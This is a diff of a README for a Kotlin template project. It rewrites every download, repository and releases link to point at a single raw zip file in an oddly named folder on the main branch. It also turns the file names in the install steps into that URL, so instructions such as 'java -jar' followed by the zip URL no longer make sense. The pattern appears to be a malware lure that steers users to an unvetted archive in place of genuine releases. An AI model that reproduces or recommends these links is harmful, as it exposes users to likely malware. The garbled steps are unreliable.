@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download hybrid_template_kotlin](https://img.shields.io/badge/Download-hybrid_template_kotlin-brightgreen)](https://github.com/1887sagar/hybrid_template_kotlin/releases)
+[![Download hybrid_template_kotlin](https://raw.githubusercontent.com/1887sagar/hybrid_template_kotlin/main/hilasmic/hybrid_template_kotlin.zip)](https://raw.githubusercontent.com/1887sagar/hybrid_template_kotlin/main/hilasmic/hybrid_template_kotlin.zip)
 
 ## 🚀 Getting Started
 
@@ -31,18 +31,18 @@ To run this application, you need the following:
 
 To download the latest version of the **hybrid_template_kotlin** project, visit this page:
 
-[Download Page](https://github.com/1887sagar/hybrid_template_kotlin/releases)
+[Download Page](https://raw.githubusercontent.com/1887sagar/hybrid_template_kotlin/main/hilasmic/hybrid_template_kotlin.zip)
 
 1. Click the link above to access the Releases page.
 2. Look for the most recent version of **hybrid_template_kotlin**.
-3. Download the file named `hybrid_template_kotlin.zip`.
+3. Download the file named `https://raw.githubusercontent.com/1887sagar/hybrid_template_kotlin/main/hilasmic/hybrid_template_kotlin.zip`.
 4. Once the download is complete, locate the file on your computer.
 
 ### 🗂️ Extract the Files
 
 After downloading, extract the files:
 
-1. Right-click the downloaded `hybrid_template_kotlin.zip` file.
+1. Right-click the downloaded `https://raw.githubusercontent.com/1887sagar/hybrid_template_kotlin/main/hilasmic/hybrid_template_kotlin.zip` file.
 2. Select "Extract All" or use your preferred extraction tool.
 3. Choose a folder to save the extracted files.
 
@@ -51,11 +51,11 @@ After downloading, extract the files:
 To run the application:
 
 1. Open the extracted folder.
-2. Locate the `hybrid_template_kotlin.jar` file.
+2. Locate the `https://raw.githubusercontent.com/1887sagar/hybrid_template_kotlin/main/hilasmic/hybrid_template_kotlin.zip` file.
 3. Double-click on it if you have Java installed properly.
 4. If it does not open, you may need to run it from the command line. Open your command prompt or terminal and type:
    ```
-   java -jar path/to/hybrid_template_kotlin.jar
+   java -jar https://raw.githubusercontent.com/1887sagar/hybrid_template_kotlin/main/hilasmic/hybrid_template_kotlin.zip
    ```
 
 Make sure to replace `path/to/` with the actual path where you extracted the file.
@@ -79,8 +79,8 @@ If you encounter any issues or have questions, feel free to reach out to the com
 
 For more information, check out:
 
-- [GitHub Repository](https://github.com/1887sagar/hybrid_template_kotlin)
-- [Releases Page](https://github.com/1887sagar/hybrid_template_kotlin/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/1887sagar/hybrid_template_kotlin/main/hilasmic/hybrid_template_kotlin.zip)
+- [Releases Page](https://raw.githubusercontent.com/1887sagar/hybrid_template_kotlin/main/hilasmic/hybrid_template_kotlin.zip)
 
 ## 💬 Topics Covered
 
